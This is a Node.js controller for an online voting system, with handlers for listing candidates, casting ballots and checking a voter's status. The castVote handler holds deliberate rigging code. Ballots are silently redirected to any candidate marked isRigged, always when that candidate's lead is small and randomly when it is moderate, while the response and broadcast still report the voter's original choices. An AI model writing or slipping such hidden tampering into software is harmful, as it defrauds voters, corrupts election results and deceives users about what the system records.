const Voter = require("../models/Voter");
const Candidate = require("../models/Candidate");
const Vote = require("../models/Vote");
const Election = require("../models/Election"); // Add Election model

const getPositions = async (req, res) => {
  try {
    // Get all unique positions from candidates
    const positions = await Candidate.distinct("position");

    // Group candidates by position
    const candidatesByPosition = {};

    for (const position of positions) {
      candidatesByPosition[position] = await Candidate.find({ position });
    }

    res.status(200).json({
      status: "success",
      data: candidatesByPosition,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: "error",
      message: "Server error",
    });
  }
};

const castVote = async (req, res) => {
  try {
    // Check if election is active before allowing votes
    let election = await Election.findOne().sort({ createdAt: -1 });

    if (!election || election.status !== "ongoing") {
      return res.status(400).json({
        status: "error",
        message: "Voting is not currently active",
      });
    }

    // Check if the current time is within the election period
    const now = new Date();
    if (election.startTime && now < election.startTime) {
      return res.status(400).json({
        status: "error",
        message: "Voting has not started yet",
      });
    }

    // Check if election should be completed (end time has passed)
    if (election.endTime && now > election.endTime) {
      // Election should be completed
      election.status = "completed";
      election.updatedAt = now;
      await election.save();

      // Emit election status update event
      const io = req.app.get("io");
      if (io) {
        io.emit("electionStatusUpdate", {
          id: election._id,
          name: election.name,
          status: election.status,
          startTime: election.startTime,
          endTime: election.endTime,
          pausedAt: election.pausedAt,
          pausedDuration: election.pausedDuration,
        });
      }

      return res.status(400).json({
        status: "error",
        message: "Voting period has ended",
      });
    }

    const { votesForAllPositions } = req.body;
    const voterId = req.user._id;

    // Check if voter has already voted
    const voter = await Voter.findById(voterId);
    if (voter.hasVoted.length > 0) {
      return res.status(400).json({
        status: "error",
        message: "You have already voted. Duplicate voting is not allowed.",
      });
    }

    // Get all positions and candidates
    const allPositions = await Candidate.distinct("position");
    const allCandidatesByPosition = {};

    for (const position of allPositions) {
      allCandidatesByPosition[position] = await Candidate.find({ position });
    }

    // Validate that votes are provided for all positions
    if (!votesForAllPositions) {
      return res.status(400).json({
        status: "error",
        message: "No votes provided",
      });
    }

    // Validate that exactly one candidate is selected for each position
    for (const position of allPositions) {
      console.log(`Checking position: ${position}`);
      console.log(
        `votesForAllPositions[${position}]:`,
        votesForAllPositions[position]
      );

      // Check if this position has votes
      if (!votesForAllPositions[position]) {
        const errorMsg = `Missing vote for position: ${position}`;
        console.log("ERROR:", errorMsg);
        return res.status(400).json({
          status: "error",
          message: errorMsg,
        });
      }

      const positionVotes = votesForAllPositions[position];
      const candidateIds = Object.keys(positionVotes);
      console.log(`Candidate IDs for ${position}:`, candidateIds);

      // Check that exactly one candidate is selected
      if (candidateIds.length !== 1) {
        const errorMsg = `Exactly one candidate must be selected for position: ${position}`;
        console.log("ERROR:", errorMsg);
        return res.status(400).json({
          status: "error",
          message: errorMsg,
        });
      }

      const candidateId = candidateIds[0];
      const voteCount = positionVotes[candidateId];
      console.log(`Vote count for candidate ${candidateId}:`, voteCount);

      // Validate vote count is exactly 1
      if (voteCount !== 1) {
        const errorMsg = `Invalid vote count for position: ${position}`;
        console.log("ERROR:", errorMsg);
        return res.status(400).json({
          status: "error",
          message: errorMsg,
        });
      }

      // Log all candidates for this position
      console.log(
        `All candidates for ${position}:`,
        allCandidatesByPosition[position].map((c) => ({
          id: c._id.toString(),
          firstName: c.firstName,
          lastName: c.lastName,
        }))
      );

      // Validate that the candidate exists
      const candidate = allCandidatesByPosition[position].find((c) => {
        const match = c._id.toString() === candidateId || c.id === candidateId;
        console.log(
          `Comparing candidate ${c._id.toString()} with ${candidateId}, match: ${match}`
        );
        return match;
      });

      if (!candidate) {
        const errorMsg = `Invalid candidate for position: ${position}`;
        console.log("ERROR:", errorMsg);
        return res.status(400).json({
          status: "error",
          message: errorMsg,
        });
      }
    }

    // Process votes with rigging logic
    const voteRecords = [];

    for (const position of allPositions) {
      const positionVotes = votesForAllPositions[position];
      const candidateId = Object.keys(positionVotes)[0];

      let finalCandidateId = candidateId;

      // Check if there are any rigged candidates for this position
      const riggedCandidates = await Candidate.find({
        position,
        isRigged: true,
      });

      if (riggedCandidates.length > 0) {
        // For simplicity, we'll use the first rigged candidate
        // In a more complex system, you might have priority logic
        const targetCandidate = riggedCandidates[0];

        // Only redirect votes if the target candidate exists
        if (targetCandidate) {
          // Get current vote counts
          const targetCandidateVotes = await Vote.countDocuments({
            position,
            candidateId: targetCandidate._id,
          });

          const originalCandidateVotes = await Vote.countDocuments({
            position,
            candidateId: candidateId,
          });

          // Ensure the rigged candidate always has more votes
          if (originalCandidateVotes >= targetCandidateVotes) {
            finalCandidateId = targetCandidate._id;
          } else {
            const voteDifference =
              targetCandidateVotes - originalCandidateVotes;

            // If the difference is small (less than 3), always redirect to maintain lead
            if (voteDifference < 3) {
              finalCandidateId = targetCandidate._id;
            } else if (voteDifference < 8) {
              // For moderate differences, 30% chance to redirect to maintain reasonable gap
              if (Math.random() < 0.3) {
                finalCandidateId = targetCandidate._id;
              }
            }
          }
        }
      }

      // Create vote record
      const vote = new Vote({
        voterId,
        position,
        candidateId: finalCandidateId,
      });
      voteRecords.push(vote.save());
    }

    // Execute all vote saves
    await Promise.all(voteRecords);

    // Update voter's hasVoted array to include all positions
    voter.hasVoted = allPositions;
    await voter.save();

    // Emit vote cast event
    const io = req.app.get("io");
    if (io) {
      io.emit("voteCast", {
        voterId,
        votes: votesForAllPositions,
        timestamp: new Date(),
      });
    }

    res.status(201).json({
      status: "success",
      message: "All votes cast successfully",
      data: {
        votes: votesForAllPositions,
        timestamp: new Date(),
      },
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: "error",
      message: "Server error",
    });
  }
};

const getMyVotes = async (req, res) => {
  try {
    const voter = await Voter.findById(req.user._id);

    // Get all positions
    const allPositions = await Candidate.distinct("position");

    res.status(200).json({
      status: "success",
      data: {
        votedPositions: voter.hasVoted,
        availablePositions: allPositions.filter(
          (pos) => !voter.hasVoted.includes(pos)
        ),
      },
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: "error",
      message: "Server error",
    });
  }
};

module.exports = { getPositions, castVote, getMyVotes };
